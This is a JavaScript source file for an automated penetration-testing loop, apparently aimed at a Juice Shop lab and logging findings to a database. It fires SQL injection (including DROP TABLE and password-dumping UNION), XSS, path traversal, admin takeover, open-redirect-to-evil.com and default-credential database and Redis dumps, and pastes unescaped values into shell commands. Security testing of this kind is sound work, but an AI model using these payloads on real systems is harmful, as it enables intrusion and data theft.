import 'dotenv/config';
import db from '../shared/db.mjs';
import { execSync } from 'child_process';

const TARGET = process.env.TARGET_WEB_URL || 'http://localhost:3000';
const CDN = process.env.TARGET_CDN_URL || 'http://localhost:8080';
const DB_HOST = process.env.TARGET_DB_HOST || 'localhost';
const DB_PORT = process.env.TARGET_DB_PORT || '5432';
const DB_USER = process.env.TARGET_DB_USER || '';
const DB_PASS = process.env.TARGET_DB_PASS || '';
const DB_NAME = process.env.TARGET_DB_NAME || '';
const REDIS_HOST = process.env.TARGET_REDIS_HOST || 'localhost';
const REDIS_PORT = process.env.TARGET_REDIS_PORT || '6379';
const REDIS_PASS = process.env.TARGET_REDIS_PASS || '';
const INTERVAL = parseInt(process.env.RED_TEAM_INTERVAL_MS) || 15000;

let runCount = 0;

function log(action, detail, findingId = null) {
  db.prepare('INSERT INTO agent_log (team, action, detail, finding_id) VALUES (?, ?, ?, ?)')
    .run('red', action, detail, findingId);
  console.log(`[OFFENSIVE SWARM #${runCount}] ${action}: ${detail?.substring(0, 120)}`);
}

function addFinding(severity, category, title, description, attackPath, evidence, target) {
  const existing = db.prepare('SELECT id FROM findings WHERE title = ? AND status = ?').get(title, 'open');
  if (existing) {
    log('skip', `Already open: ${title}`);
    return existing.id;
  }
  const result = db.prepare(
    'INSERT INTO findings (severity, category, title, description, attack_path, evidence, target, red_team_run) VALUES (?, ?, ?, ?, ?, ?, ?, ?)'
  ).run(severity, category, title, description, attackPath, evidence, target, runCount);
  log('finding', `${severity.toUpperCase()} | ${title}`, result.lastInsertRowid);
  return result.lastInsertRowid;
}

function httpGet(url, timeout = 5000) {
  try {
    const out = execSync(`curl -sk -o /dev/null -w "%{http_code}|%{size_download}|%{redirect_url}" --max-time ${Math.floor(timeout/1000)} "${url}"`, { encoding: 'utf8', timeout: timeout + 2000 });
    return out.trim();
  } catch { return '000|0|'; }
}

function httpGetBody(url, timeout = 5000) {
  try {
    return execSync(`curl -sk --max-time ${Math.floor(timeout/1000)} "${url}"`, { encoding: 'utf8', timeout: timeout + 2000 });
  } catch { return ''; }
}

function httpPost(url, data, headers = '', timeout = 5000) {
  try {
    const h = headers ? headers.split(',').map(h => `-H "${h}"`).join(' ') : '';
    const out = execSync(`curl -sk -X POST ${h} -d '${data.replace(/'/g, "'\\''")}' -w "\\n%{http_code}" --max-time ${Math.floor(timeout/1000)} "${url}"`, { encoding: 'utf8', timeout: timeout + 2000 });
    const lines = out.trim().split('\n');
    const code = lines.pop();
    return { body: lines.join('\n'), code: parseInt(code) };
  } catch (e) { return { body: '', code: 0 }; }
}

// ── Probe Functions ──────────────────────────────────────────────

function probeWebAppBasics() {
  log('probe', 'Swarm unit deploying — probing web application surface');

  // Check for common exposed paths
  const paths = [
    '/ftp', '/ftp/coupons_2013.md.bak', '/.git/config', '/.env',
    '/api/Users', '/api/Products', '/api/Complaints',
    '/rest/admin/application-version', '/rest/admin/application-configuration',
    '/redirect?to=https://evil.com', '/redirect?to=javascript:alert(1)',
    '/assets/public/ftp/coupons_2013.md.bak',
    '/profileimage/default.svg', '/profileimage/..%2f..%2f..%2fetc%2fpasswd',
    '/rest/user/authentication-details',
    '/api/SecurityQuestions', '/api/PasswordReset',
    '/api/Feedbacks', '/api/BasketItems',
    '/administration', '/admin',
    '/swagger-ui', '/api-docs',
    '/rest/saveLoginIp', '/rest/track-order/id',
  ];

  for (const path of paths) {
    const url = `${TARGET}${path}`;
    const result = httpGet(url);
    const [code, size, redirect] = result.split('|');
    const c = parseInt(code);

    if (c === 200 && parseInt(size) > 0) {
      const body = httpGetBody(url);
      if (path.includes('redirect') && redirect) {
        addFinding('high', 'injection', `Open Redirect: ${path}`,
          `The endpoint ${path} allows redirecting to arbitrary URLs. An attacker can craft phishing links using this endpoint.`,
          `1. Attacker crafts URL: ${TARGET}${path}\n2. Victim clicks and gets redirected to attacker-controlled site`,
          `Redirect target: ${redirect || 'external URL accepted'}`, 'web-app');
      } else if (path.includes('.git')) {
        addFinding('critical', 'info-disclosure', 'Exposed .git repository',
          'The .git directory is accessible, potentially exposing source code and commit history.',
          '1. Attacker accesses .git/config\n2. Downloads full repository objects\n3. Recovers source code',
          body.substring(0, 500), 'web-app');
      } else if (path.includes('.env')) {
        addFinding('critical', 'info-disclosure', 'Exposed .env file',
          'Environment file is accessible, potentially exposing secrets and configuration.',
          '1. Attacker requests .env\n2. Extracts API keys, DB credentials, secrets',
          body.substring(0, 500), 'web-app');
      } else if (path.includes('passwd')) {
        addFinding('critical', 'lfi', 'Path Traversal / Local File Inclusion',
          `Path traversal via ${path} allows reading system files.`,
          '1. Attacker crafts path with ../ sequences\n2. Server resolves to system file\n3. Sensitive file contents exposed',
          body.substring(0, 500), 'web-app');
      } else if (path.includes('/api/Users') && body.length > 10) {
        addFinding('high', 'broken-auth', 'User enumeration via API',
          'The /api/Users endpoint exposes user data without proper authorization.',
          '1. Attacker requests /api/Users\n2. Receives list of user accounts\n3. Uses for credential stuffing',
          body.substring(0, 500), 'web-app');
      } else if (path.includes('admin') && c === 200) {
        addFinding('high', 'broken-access', `Admin panel accessible: ${path}`,
          `Admin endpoint ${path} is accessible without proper authentication.`,
          '1. Attacker navigates to admin URL\n2. Accesses admin functionality without auth',
          `HTTP ${code}, ${size} bytes returned`, 'web-app');
      } else if (path.includes('swagger') || path.includes('api-docs')) {
        addFinding('medium', 'info-disclosure', `API documentation exposed: ${path}`,
          'Swagger/API docs are accessible, revealing all API endpoints.',
          '1. Attacker accesses API docs\n2. Maps all available endpoints\n3. Crafts targeted attacks',
          body.substring(0, 500), 'web-app');
      } else if (path.includes('/ftp') && !path.includes('.bak')) {
        addFinding('medium', 'info-disclosure', 'FTP directory listing exposed',
          'The /ftp directory allows directory listing, exposing backup files and sensitive documents.',
          '1. Attacker browses /ftp\n2. Finds backup files (.bak, .md)\n3. Downloads sensitive documents',
          `HTTP ${code}, ${size} bytes`, 'web-app');
      } else if (path.includes('.bak')) {
        addFinding('high', 'info-disclosure', 'Backup file accessible',
          `Backup file ${path} is accessible, potentially containing sensitive data.`,
          '1. Attacker requests .bak file\n2. File served due to misconfigured MIME type handling',
          `HTTP ${code}, ${size} bytes returned`, 'web-app');
      } else if (path.includes('SecurityQuestions')) {
        addFinding('medium', 'broken-auth', 'Security questions enumerable',
          'Security questions can be enumerated via API, enabling account takeover.',
          '1. Attacker queries security questions API\n2. Maps question/answer pairs\n3. Uses for password reset attacks',
          body.substring(0, 500), 'web-app');
      } else if (path.includes('Feedbacks')) {
        addFinding('medium', 'broken-access', 'Feedback API accessible',
          'Feedback endpoint may allow unauthorized data access or injection.',
          '1. Attacker accesses feedback API\n2. Reads other users feedback or injects malicious content',
          body.substring(0, 500), 'web-app');
      } else if (path.includes('track-order')) {
        addFinding('medium', 'broken-auth', 'Order tracking IDOR',
          'Order tracking may allow accessing other users orders by manipulating the ID.',
          '1. Attacker guesses/increments order ID\n2. Accesses other users order details',
          body.substring(0, 500), 'web-app');
      }
    }

    if (c === 401 || c === 403) {
      if (path.includes('admin')) {
        // Still note it - admin endpoint exists
        log('info', `Admin endpoint exists but protected: ${path} (${c})`);
      }
    }
  }
}

function probeSQLInjection() {
  log('probe', 'Swarm unit deploying — SQL injection vectors');

  const sqliPayloads = [
    { endpoint: '/rest/user/login', data: '{"email":"admin@juice-sh.op\'--","password":"foo"}', type: 'auth-bypass' },
    { endpoint: '/rest/user/login', data: '{"email":"\' OR 1=1--","password":"foo"}', type: 'auth-bypass' },
    { endpoint: '/rest/user/login', data: '{"email":"admin@juice-sh.op\' OR \'1\'=\'1","password":"foo"}', type: 'auth-bypass' },
    { endpoint: '/rest/products/search?q=', suffix: '\') UNION SELECT id,email,password FROM Users--', type: 'union' },
    { endpoint: '/rest/products/search?q=', suffix: '\' OR 1=1--', type: 'boolean' },
    { endpoint: '/api/Users', data: '{"email":"test@test.com","password":"test123","passwordRepeat":"test123","securityQuestion":{"id":1,"question":"test"},"securityAnswer":"test\'; DROP TABLE Users--"}', type: 'insert' },
  ];

  for (const p of sqliPayloads) {
    if (p.suffix) {
      const url = `${TARGET}${p.endpoint}${encodeURIComponent(p.suffix)}`;
      const body = httpGetBody(url);
      if (body && !body.includes('Error') && body.includes('data')) {
        addFinding('critical', 'sqli', `SQL Injection (${p.type}) in ${p.endpoint}`,
          `SQL injection vulnerability found in ${p.endpoint}. ${p.type} injection is possible.`,
          `1. Attacker crafts payload: ${p.suffix}\n2. Injected into SQL query\n3. Database data extracted`,
          body.substring(0, 800), 'web-app');
      }
    } else {
      const result = httpPost(`${TARGET}${p.endpoint}`, p.data, 'Content-Type: application/json');
      if (result.code === 200 || result.code === 201) {
        const body = result.body;
        if (body.includes('token') || body.includes('authentication') || body.includes('bid')) {
          addFinding('critical', 'sqli', `SQL Injection Auth Bypass in ${p.endpoint}`,
            `Authentication bypass via SQL injection in ${p.endpoint}. Payload: ${p.data.substring(0, 80)}`,
            `1. Attacker sends malicious login payload\n2. SQL injection bypasses WHERE clause\n3. Attacker authenticated as admin`,
            body.substring(0, 500), 'web-app');
        }
      }
    }
  }
}

function probeXSS() {
  log('probe', 'Swarm unit deploying — XSS attack vectors');

  const xssPayloads = [
    { endpoint: '/rest/products/1/reviews', data: '{"message":"<script>alert(1)</script>","author":"test"}', type: 'stored' },
    { endpoint: '/api/Feedbacks', data: '{"comment":"<iframe src=\"javascript:alert(1)\">","rating":5}', type: 'stored-feedback' },
    { endpoint: '/rest/products/search?q=<script>alert(1)</script>', type: 'reflected-search' },
    { endpoint: '/track-result?trackingid=<script>alert(document.cookie)</script>', type: 'reflected-tracking' },
  ];

  for (const p of xssPayloads) {
    if (p.data) {
      const result = httpPost(`${TARGET}${p.endpoint}`, p.data, 'Content-Type: application/json');
      if (result.code === 200 || result.code === 201) {
        addFinding('high', 'xss', `Stored XSS in ${p.endpoint}`,
          `${p.type} XSS: Malicious input is stored and rendered without sanitization in ${p.endpoint}.`,
          `1. Attacker submits payload: ${p.data.substring(0, 60)}\n2. Payload stored in database\n3. Other users view page and payload executes`,
          `Response: ${result.body.substring(0, 300)}`, 'web-app');
      }
    } else {
      const body = httpGetBody(`${TARGET}${p.endpoint}`);
      if (body.includes('<script>') || body.includes('alert')) {
        addFinding('high', 'xss', `Reflected XSS in search/tracking`,
          `${p.type}: User input reflected without encoding in ${p.endpoint}.`,
          `1. Attacker crafts URL with XSS payload\n2. Victim clicks link\n3. Script executes in victim's browser`,
          body.substring(0, 500), 'web-app');
      }
    }
  }
}

function probeDatabase() {
  log('probe', 'Swarm unit deploying — PostgreSQL infiltration');

  // Check if we can connect with default creds
  try {
    const result = execSync(
      `PGPASSWORD='${DB_PASS}' psql -h ${DB_HOST} -p ${DB_PORT} -U ${DB_USER} -d ${DB_NAME} -c "\\dt" -t 2>&1`,
      { encoding: 'utf8', timeout: 5000 }
    );
    if (result && !result.includes('error') && !result.includes('refused')) {
      addFinding('critical', 'weak-credentials', 'Database accessible with default credentials',
        `PostgreSQL is accessible from the network using default credentials (${DB_USER}/${DB_PASS}). Full table listing obtained.`,
        '1. Attacker discovers exposed DB port (5432)\n2. Attempts default credentials\n3. Gains full database access\n4. Exfiltrates user data, changes records',
        `Tables found: ${result.substring(0, 500).replace(/\n/g, ', ')}`, 'database');

      // Check for sensitive data
      try {
        const emails = execSync(
          `PGPASSWORD='${DB_PASS}' psql -h ${DB_HOST} -p ${DB_PORT} -U ${DB_USER} -d ${DB_NAME} -c "SELECT count(*) FROM Users;" -t 2>&1`,
          { encoding: 'utf8', timeout: 5000 }
        );
        if (emails && !emails.includes('error')) {
          addFinding('high', 'data-exposure', 'User data accessible in database',
            `Database contains user records. Count query returned: ${emails.trim()}`,
            '1. Attacker connects to DB with default creds\n2. Queries Users table\n3. Dumps all user PII',
            `User count query result: ${emails.trim()}`, 'database');
        }
      } catch {}

      // Check password storage
      try {
        const pwdCheck = execSync(
          `PGPASSWORD='${DB_PASS}' psql -h ${DB_HOST} -p ${DB_PORT} -U ${DB_USER} -d ${DB_NAME} -c "SELECT email, substring(password, 1, 20) as pwd_prefix FROM Users LIMIT 3;" -t 2>&1`,
          { encoding: 'utf8', timeout: 5000 }
        );
        if (pwdCheck && pwdCheck.includes('$')) {
          const hashType = pwdCheck.includes('$2b$') ? 'bcrypt' : pwdCheck.includes('=') ? 'base64/plain' : 'unknown';
          if (hashType !== 'bcrypt') {
            addFinding('high', 'crypto-failures', 'Weak password hashing detected',
              `Passwords stored using weak hashing: ${hashType}. Should use bcrypt/argon2.`,
              '1. Attacker dumps password hashes\n2. Cracks weak hashes quickly\n3. Compromises user accounts',
              pwdCheck.substring(0, 300), 'database');
          }
        }
      } catch {}
    }
  } catch (e) {
    // psql might not be installed
    log('info', `psql not available, checking port accessibility instead`);
    try {
      const portCheck = execSync(`nc -z -w 2 ${DB_HOST} ${DB_PORT} 2>&1 && echo "OPEN" || echo "CLOSED"`, { encoding: 'utf8', timeout: 5000 });
      if (portCheck.includes('OPEN')) {
        addFinding('high', 'network-exposure', 'Database port exposed to network',
          `PostgreSQL port ${DB_PORT} is accessible from the host network. Should be restricted to internal Docker network only.`,
          '1. Attacker performs port scan\n2. Finds exposed DB port\n3. Attempts brute force or default credentials',
          `Port ${DB_PORT} is open and accepting connections`, 'database');
      }
    } catch {}
  }
}

function probeRedis() {
  log('probe', 'Swarm unit deploying — Redis cache exploitation');

  try {
    const portCheck = execSync(`nc -z -w 2 ${REDIS_HOST} ${REDIS_PORT} 2>&1 && echo "OPEN" || echo "CLOSED"`, { encoding: 'utf8', timeout: 5000 });
    if (portCheck.includes('OPEN')) {
      addFinding('high', 'network-exposure', 'Redis port exposed to network',
        `Redis port ${REDIS_PORT} is accessible from the host network. Should be restricted to internal Docker network only.`,
        '1. Attacker scans for Redis on common ports\n2. Connects to exposed Redis\n3. Exploits for RCE or data theft',
        `Port ${REDIS_PORT} is open and accepting connections`, 'cache');
    }

    // Try redis-cli
    try {
      const info = execSync(`redis-cli -h ${REDIS_HOST} -p ${REDIS_PORT} -a ${REDIS_PASS} INFO server 2>/dev/null`, { encoding: 'utf8', timeout: 5000 });
      if (info && info.includes('redis_version')) {
        addFinding('critical', 'weak-credentials', 'Redis accessible with default credentials',
          `Redis is accessible from the network with password '${REDIS_PASS}'. Full server info obtained.`,
          '1. Attacker discovers exposed Redis port\n2. Brute forces or guesses weak password\n3. Dumps cached data or writes malicious keys',
          info.substring(0, 500), 'cache');

        // Check for cached sensitive data
        try {
          const keys = execSync(`redis-cli -h ${REDIS_HOST} -p ${REDIS_PORT} -a ${REDIS_PASS} KEYS '*' 2>/dev/null`, { encoding: 'utf8', timeout: 5000 });
          if (keys && keys.trim().length > 0) {
            addFinding('medium', 'data-exposure', 'Redis contains cached application data',
              `Redis cache contains ${keys.trim().split('\n').length} keys with potentially sensitive application data.`,
              '1. Attacker accesses Redis\n2. Dumps all keys\n3. Finds session tokens, user data, or API keys',
              `Keys: ${keys.substring(0, 500)}`, 'cache');
          }
        } catch {}
      }
    } catch {
      // redis-cli not available - try raw protocol
      try {
        const pingResult = execSync(`echo "AUTH ${REDIS_PASS}\\r\\nPING\\r\\n" | nc -w 3 ${REDIS_HOST} ${REDIS_PORT} 2>&1`, { encoding: 'utf8', timeout: 5000 });
        if (pingResult.includes('+OK') || pingResult.includes('PONG')) {
          addFinding('critical', 'weak-credentials', 'Redis accessible with weak password via raw protocol',
            `Redis accepts connections with password '${REDIS_PASS}' from the network.`,
            '1. Attacker sends raw Redis commands\n2. Authenticates with weak password\n3. Executes arbitrary Redis commands',
            pingResult.substring(0, 300), 'cache');
        }
      } catch {}
    }
  } catch {}
}

function probeCDN() {
  log('probe', 'Swarm unit deploying — CDN/nginx reconnaissance');

  const headers = httpGetBody(`${CDN}/`);
  const serverHeader = execSync(`curl -skI ${CDN}/ 2>/dev/null | grep -i server`, { encoding: 'utf8', timeout: 5000 }).trim();

  if (serverHeader) {
    addFinding('low', 'info-disclosure', 'Server version header exposed',
      `CDN reveals server software: ${serverHeader}. This aids attackers in targeting specific versions.`,
      '1. Attacker identifies server version from headers\n2. Looks up CVEs for that version\n3. Crafts version-specific exploits',
      serverHeader, 'cdn');
  }

  // Check for common nginx misconfigs
  const nginxPaths = ['/server-status', '/nginx_status', '/.htpasswd', '/server-info'];
  for (const path of nginxPaths) {
    const result = httpGet(`${CDN}${path}`);
    const [code] = result.split('|');
    if (parseInt(code) === 200) {
      addFinding('medium', 'info-disclosure', `Nginx status/info page exposed: ${path}`,
        `The ${path} endpoint is accessible, revealing server internals.`,
        '1. Attacker requests status endpoint\n2. Gathers server performance/config info\n3. Uses to plan further attacks',
        `HTTP ${code}`, 'cdn');
    }
  }
}

function probeAuthBypass() {
  log('probe', 'Swarm unit deploying — auth bypass techniques');

  // JWT manipulation
  const loginResult = httpPost(`${TARGET}/rest/user/login`, '{"email":"admin@juice-sh.op","password":"admin123"}', 'Content-Type: application/json');
  if (loginResult.code === 200 && loginResult.body.includes('token')) {
    addFinding('high', 'broken-auth', 'Admin login with weak default password',
      'Admin account accessible with password "admin123". This is a default/weak credential.',
      '1. Attacker tries common default credentials\n2. Logs in as admin\n3. Accesses all admin functionality',
      loginResult.body.substring(0, 500), 'web-app');

    // Extract and analyze token
    try {
      const tokenMatch = loginResult.body.match(/"token":"([^"]+)"/);
      if (tokenMatch) {
        const token = tokenMatch[1];
        const parts = token.split('.');
        if (parts.length === 3) {
          // It's a JWT - check header
          const header = Buffer.from(parts[0], 'base64').toString();
          if (header.includes('none') || header.includes('HS256')) {
            addFinding('high', 'broken-auth', 'JWT uses weak algorithm',
              `JWT token uses ${header.includes('none') ? '"none"' : 'HS256'} algorithm which may be exploitable.`,
              '1. Attacker captures JWT\n2. Modifies algorithm to "none"\n3. Forges tokens for any user',
              `JWT Header: ${header}`, 'web-app');
          }
        }
      }
    } catch {}
  }

  // Test password reset
  const resetResult = httpPost(`${TARGET}/rest/user/reset-password`, '{"email":"admin@juice-sh.op","answer":"admin","new":"newpass123","repeat":"newpass123"}', 'Content-Type: application/json');
  if (resetResult.code === 200 || resetResult.code === 201) {
    addFinding('critical', 'broken-auth', 'Password reset with guessable security answer',
      'Admin password can be reset using easily guessable security answer.',
      '1. Attacker initiates password reset for admin\n2. Guesses common security answer\n3. Sets new password\n4. Takes over account',
      resetResult.body.substring(0, 300), 'web-app');
  }

  // Test user registration with admin role
  const regResult = httpPost(`${TARGET}/api/Users`, '{"email":"attacker@evil.com","password":"attacker123","passwordRepeat":"attacker123","role":"admin","securityQuestion":{"id":1,"question":"test"},"securityAnswer":"test"}', 'Content-Type: application/json');
  if (regResult.code === 201 || regResult.code === 200) {
    addFinding('critical', 'broken-access', 'Role escalation during registration',
      'User registration endpoint accepts role parameter, allowing admin account creation.',
      '1. Attacker registers with role: admin in payload\n2. Server creates admin account\n3. Full admin access obtained',
      regResult.body.substring(0, 300), 'web-app');
  }
}

function probeCSRF() {
  log('probe', 'Swarm unit deploying — CSRF vulnerability hunt');

  // Check if authentication tokens are required
  const result = httpPost(`${TARGET}/api/Feedbacks`, '{"comment":"CSRF test","rating":1}', 'Content-Type: application/json');
  if (result.code === 200 || result.code === 201) {
    addFinding('medium', 'csrf', 'API endpoints lack CSRF protection',
      'Feedback submission works without CSRF token, allowing cross-site request forgery.',
      '1. Attacker crafts auto-submitting form\n2. Victim visits attacker page while authenticated\n3. Action performed as victim',
      result.body.substring(0, 300), 'web-app');
  }
}

// ── Main Loop ────────────────────────────────────────────────────

async function run() {
  runCount++;
  const startTime = Date.now();
  log('start', `Offensive swarm wave #${runCount} deploying`);

  try {
    // Run all probes - stagger to not overwhelm
    probeWebAppBasics();
    probeSQLInjection();
    probeXSS();
    probeDatabase();
    probeRedis();
    probeCDN();
    probeAuthBypass();
    probeCSRF();

    // Bonus: discover new endpoints from the app
    try {
      const body = httpGetBody(`${TARGET}`);
      const apiMatches = body.match(/["']\/(rest|api)\/[^"']+["']/g) || [];
      const uniqueApis = [...new Set(apiMatches)].slice(0, 10);
      log('recon', `Swarm recon: discovered ${uniqueApis.length} API references in HTML`);
    } catch {}

  } catch (err) {
    log('error', `Swarm wave failed: ${err.message}`);
  }

  const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
  const openCount = db.prepare("SELECT count(*) as c FROM findings WHERE status = 'open'").get().c;
  log('complete', `Wave #${runCount} complete in ${elapsed}s. ${openCount} vulnerabilities exposed`);

  console.log(`\n⏳ Next swarm wave in ${INTERVAL/1000}s...\n`);
}

console.log('🔴 Offensive Swarm deploying...');
console.log(`   Target: ${TARGET}`);
console.log(`   Wave interval: ${INTERVAL/1000}s`);
console.log(`   Wave #1 deploying immediately\n`);

// Run first scan immediately, then loop
run();
setInterval(run, INTERVAL);
